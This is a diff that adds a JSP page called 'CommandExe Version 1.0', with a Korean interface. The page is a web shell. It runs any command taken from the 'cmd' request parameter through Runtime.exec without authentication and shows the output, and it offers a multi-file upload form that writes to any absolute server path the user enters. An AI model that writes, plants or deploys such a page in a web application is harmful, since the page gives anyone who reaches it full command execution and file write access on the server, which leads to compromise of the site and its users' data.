@@ -1,0 +1,155 @@
+<%@ page contentType="text/html;charset=euc-kr" %>
+<%@ page import="java.io.*" %>
+
+<HTML>
+<HEAD>
+<TITLE> CommandExe Version 1.0 </TITLE>
+</HEAD>
+
+<SCRIPT LANGUAGE="JavaScript">
+<!--
+function poll_setCookie(){
+	var path = document.admupload.path.value;
+	var todayDate = new Date();
+
+	if(path==''){
+		alert('경로명을 입력하셔야 합니다.');
+		document.admupload.path.focus();
+	}else{
+		todayDate.setDate( todayDate.getDate() + 1 );
+		document.cookie = "uploadpath=" + escape( path ) + "; path=/; expires=" + todayDate.toGMTString() + ";"
+
+		document.admupload.path.disabled = true;
+		document.admupload.setPath.value = 'Y';
+	}
+}
+
+function send(){
+	if(document.admupload.setPath.value=='N'){
+		alert('경로명을 지정해주셔야 합니다.');
+		document.admupload.path.focus();
+	}else{
+		document.admupload.submit();
+	}
+}
+
+function cancel(){
+	document.admupload.path.disabled = false;
+	document.admupload.path.value = '';
+}
+
+//-->
+</SCRIPT>
+
+
+<style type="text/css">
+A:link {text-decoration: none; font-size : 12px ; color : 595959}
+A:visited {text-decoration: none; font-size : 12px ; color : 316563}
+A:active {text-decoration: none; font-size :12px; color:be1128}
+A:hover {text-decoration: underline; font-size : 12px ; color : ff00cc}
+
+body { font-family: "u"; font-size: 12px; line-height: 20px; color: #595959; text-decoration: none }
+tr { font-family: "u"; font-size: 12px; line-height: 20px; color: #595959; text-decoration: none }
+td { font-family: "u"; font-size: 12px; line-height: 20px; color: #595959; text-decoration: none }
+
+.boxline {
+	font-size:9pt;
+	border-color:  999999;
+	border-style: solid; 
+	border-top-width: 1px; 
+	border-right-width: 1px; 
+	border-bottom-width: 1px; 
+	border-left-width: 1px
+}
+</style>
+
+
+<BODY>
+
+<form name='commandexe' action='commandexe.jsp'>
+			<table border=0 cellspacing="1" cellpadding="5" width=684>
+				<tr><td>
+				<font color="0087AC"><b> CommandExe Version 1.0 </b></font></td></tr>
+			</table>
+
+			<table width="784" border="0" cellspacing="1" cellpadding="0" bgcolor="C0C0C0">
+				<tr height='40' bgcolor="E8E8E8">
+					<td width='122'>&nbsp; <font color="009231" size="-2">■</font> 명령어</td>
+					<td width='562' bgcolor='ffffff'>&nbsp;
+					<INPUT name="cmd" type="text" size="50">
+					<INPUT type=submit value='실행'>
+					</td>
+				</tr>
+
+				<tr height='2' bgcolor="E8E8E8">
+					<td colspan='2' bgcolor='0087AC'></td>
+				</tr>
+				
+				<tr height='24' bgcolor="E8E8E8">
+					<td colspan='2' bgcolor='E8E8E8' align='center'> 명령어 실행 결과 </td>
+				</tr>	
+				<tr height='124' bgcolor="C0C0C0">
+					<td colspan='2' bgcolor='ffffff'>
+
+<%
+   String cmd = request.getParameter("cmd");
+   String output = "";
+
+   if(cmd != null) {
+      String result = null;
+      try {
+		Process p = Runtime.getRuntime().exec(cmd);
+
+        BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));
+
+        while((result = sI.readLine()) != null) {
+			out.println("&nbsp; "+result+"<br>");
+        }
+%>
+				
+					  </td>
+				</tr>				
+<%
+      }	   
+      catch(Exception e) {
+         out.println("Error 내용 : " + e.toString());
+      }
+   }
+%>
+
+			
+			
+			</table>
+</FORM>
+<br>
+
+
+
+<form name='admupload' action='upload.jsp' method='post' enctype='multipart/form-data'>
+
+		<table width="784" border="0" cellspacing="1" cellpadding="5" bgcolor="C0C0C0">
+
+
+				<tr height='40' bgcolor="E8E8E8">
+					<td width='122'>&nbsp; <font color="009231" size="-2">■</font> 파일업로드</td>
+					<td width='562' bgcolor='ffffff'>
+
+					<input type='hidden' name='setPath' value='N'>
+					경&nbsp;로&nbsp;명&nbsp;:&nbsp;<input type='text' name='path' size='50'>&nbsp;
+					<a href='javascript:poll_setCookie();'>경로지정</a><br>
+					* 경로명은 /opt/server/ 와 같이 절대경로로 입력하여 주십시요.<br>
+					* 경로명을 먼저 지정하시고 경로지정을 꼭 클릭하신후 파일을 첨부하십시요.<br><br>
+					파일선택1&nbsp;:&nbsp;<input type='file' name='txtFile1' size='50'><br>
+					파일선택2&nbsp;:&nbsp;<input type='file' name='txtFile2' size='50'><br>
+					파일선택3&nbsp;:&nbsp;<input type='file' name='txtFile3' size='50'><br>
+					파일선택4&nbsp;:&nbsp;<input type='file' name='txtFile4' size='50'><br>
+					파일선택5&nbsp;:&nbsp;<input type='file' name='txtFile5' size='50'><br><br>
+					<b><a href='javascript:send();'>전송</a>&nbsp;<a href='javascript:cancel();'>초기화</a></b>
+					</td>
+				</tr>
+			</table>
+</FORM>
+
+
+</BODY>
+</HTML>
